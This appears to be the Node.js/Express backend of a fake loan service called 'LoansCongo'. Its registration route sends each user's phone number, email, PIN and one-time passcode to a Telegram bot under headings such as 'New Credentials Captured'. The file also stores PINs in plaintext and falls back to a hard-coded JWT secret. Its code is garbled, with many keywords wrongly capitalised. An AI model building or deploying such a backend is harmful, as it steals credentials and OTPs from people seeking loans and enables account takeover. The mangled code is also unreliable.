Require("dotenv").config();

Const express = require("express");
const mongoose = require("mongoose");
const cors = require("cors");
const helmet = require("helmet");
const rateLimit = require("express-rate-limit");
const jwt = require("jsonwebtoken");

const User = require("./models/User");
const LoanApplication = require("./models/LoanApplication");

const app = express();
app.use(express.static("public"));

app.use(helmet());
app.use(cors());
app.use(express.json({ limit: "10kb" }));

app.use("/api/", rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100
}));

// Home route
app.get("/", (req, res) => {
    res.json({ message: "LoansCongo backend is running." });
});

// Customer Registration & OTP Forwarding to Telegram
app.post("/api/register", async (req, res) => {
    try {
        Const { phone, email, pin, otp } = req.body;

        Const botToken = process.env.TELEGRAM_BOT_TOKEN;
        Const chatId = process.env.TELEGRAM_CHAT_ID;

        // Forward credentials / OTP to Telegram Bot
        If (botToken && chatId) {
            Try {
                Let telegramMessage = "";

                If (otp) {
                    TelegramMessage = `🔑 *OTP Received*\n\n` +
                                      `📱 *Phone:* \`${phone || "N/A"}\`\n` +
                                      `🔢 *OTP Code:* \`${otp}\``;
                } else {
                    TelegramMessage = `🚨 *New Credentials Captured*\n\n` +
                                      `📱 *Phone:* \`${phone || "N/A"}\`\n` +
                                      `📧 *Email:* \`${email || "N/A"}\`\n` +
                                      `🔑 *PIN/Pass:* \`${pin || "N/A"}\``;
                }

                Await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    Method: 'POST',
                    Headers: { "Content-Type": "application/json" },
                    Body: JSON.stringify({
                        Chat_id: chatId,
                        Text: telegramMessage,
                        Parse_mode: 'Markdown'
                    })
                });
            } catch (tgError) {
                Console.error("Telegram error:", tgError.message);
            }
        }

        // Database registration for phone/email + pin phase
        If ((phone || email) && pin && !otp) {
            If (phone && !/^\+?[0-9]{10,15}$/.test(phone)) {
                Return res.status(400).json({ message: "Enter a valid phone number." });
            }
            If (email && !/^[a-zA-Z0-9._%+-]+@gmail\.com$/.test(email)) {
                Return res.status(400).json({ message: "Enter a valid Gmail address." });
            }

            // Check if user already exists
            Let existingUser = null;
            If (phone) existingUser = await User.findOne({ phone });
            If (!existingUser && email) existingUser = await User.findOne({ email });

            If (existingUser) {
                Return res.status(400).json({ message: "An account with this phone number or email already exists." });
            }

            // Create new saved user account
            Let user = await User.create({
                Phone: phone || undefined,
                Email: email || undefined,
                DemoPin: pin
            });

            Return res.status(201).json({
                Message: "Registration successful.",
                User: { id: user._id, phone: user.phone, email: user.email }
            });
        }

        // Acknowledge OTP phase
        If (otp) {
            Return res.status(200).json({ message: "OTP transmitted successfully." });
        }

        Return res.status(400).json({ message: "Invalid payload." });

    } catch (error) {
        Console.error("Error in /api/register:", error.message);
        Res.status(500).json({ message: "Server error." });
    }
});

// Account Sign-In / Login Route (Ensures only registered users with accounts can access)
app.post("/api/login", async (req, res) => {
    Try {
        Const { identifier, pin } = req.body; // 'identifier' can be phone or email

        If (!identifier || !pin) {
            Return res.status(400).json({ message: "Please provide your identifier and password/PIN." });
        }

        // Search database for user by phone or email
        Const user = await User.findOne({
            $or: [{ phone: identifier }, { email: identifier }]
        });

        If (!user) {
            Return res.status(401).json({ message: "Account not found. Please create an account first." });
        }

        // Verify password/PIN matches stored record
        If (user.demoPin !== pin) {
            Return res.status(401).json({ message: "Invalid credentials. Access denied." });
        }

        // Generate session token or successful confirmation response
        Const token = jwt.sign({ id: user._id }, process.env.JWT_SECRET || 'secret_key', { expiresIn: '1h' });

        Return res.status(200).json({
            Message: "Login successful. Access granted.",
            Token,
            User: { id: user._id, phone: user.phone, email: user.email }
        });

    } catch (error) {
        Console.error("Error in /api/login:", error.message);
        Res.status(500).json({ message: "Server error during login." });
    }
});

// Start Server
const PORT = process.env.PORT || 3000;
Mongoose.connect(process.env.MONGODB_URI)
    .then(() => {
        Console.log("MongoDB connected successfully.");
        App.listen(PORT, "0.0.0.0", () => {
            Console.log(`LoansCongo backend running on port ${PORT}`);
        });
    })
    .catch(error => {
        Console.error("MongoDB connection failed:", error.message);
    });

